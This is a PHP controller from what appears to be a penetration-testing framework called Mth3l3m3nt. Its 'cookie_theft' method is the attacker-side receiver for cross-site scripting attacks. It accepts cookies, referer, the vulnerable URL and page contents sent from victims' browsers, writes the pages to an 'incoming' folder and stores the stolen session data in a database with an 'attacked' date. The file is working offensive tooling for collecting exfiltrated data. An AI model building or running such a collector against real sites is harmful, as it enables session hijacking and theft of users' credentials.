<?php
/**
Purpose: XSS Retriever

Copyright (c) 2016 ~ alienwithin
Munir Njiru <munir@skilledsoft.com>

@version 1.0.0
@date: 31.03.2016
@url : http://munir.skilledsoft.com
 *
 **/
namespace Controller;

class Xssr extends Mth3l3m3nt
{
     function cookie_theft(\Base $f3)
    {
        if ($this->response instanceof \View\Backend) {

            // backend view do nothing for now we will do this backend stuff in the ctdb class to take advantage of the Resource Class for DB Management


        } else {
            $vulnurl = $_POST['url'];
            $cookiemonster = $_POST['cookies'];
            $referer = $_POST['referer'];
            $vulnerable_page_content = $_POST['crt_page'];
            $target_page_content = $_POST['custom_page'];
            $host_tag=parse_url($vulnurl, PHP_URL_HOST);
            $time_me = date("Y-m-d");
            $file_content_hooked_page = $f3->ROOT . $f3->BASE . '/incoming/' . $time_me . "-" . parse_url($vulnurl, PHP_URL_HOST) . '-hooked-page.mth3l3m3nt';
            $file_content_target_page = $f3->ROOT . $f3->BASE . '/incoming/' . $time_me . "-" . parse_url($vulnurl, PHP_URL_HOST) . '-target-page.mth3l3m3nt';
            file_put_contents($file_content_hooked_page, print_r($vulnerable_page_content, true), FILE_APPEND);
            file_put_contents($file_content_target_page, print_r($target_page_content, true), FILE_APPEND);
            $vuln_pc_link = $f3->SCHEME . "://" .$f3->HOST . $f3->BASE . '/incoming/' . $time_me . "-" . parse_url($vulnurl, PHP_URL_HOST) . '-hooked-page.mth3l3m3nt';
            $target_pc_link = $f3->SCHEME . "://" .$f3->HOST . $f3->BASE . '/incoming/' . $time_me . "-" . parse_url($vulnurl, PHP_URL_HOST) . '-target-page.mth3l3m3nt';
            $xssr = new \Model\Xssr();
            $xssr->hosttag = $host_tag;
            $xssr->vulnerableUrl = $vulnurl;
            $xssr->cookiemonster = $cookiemonster;
            $xssr->referer = $referer;
            $xssr->vulnerablePageContent =$vuln_pc_link;
            $xssr->indirect_target_page = $target_pc_link;
            $xssr->dateattacked = $time_me;
            $xssr->save();

        }
    }


}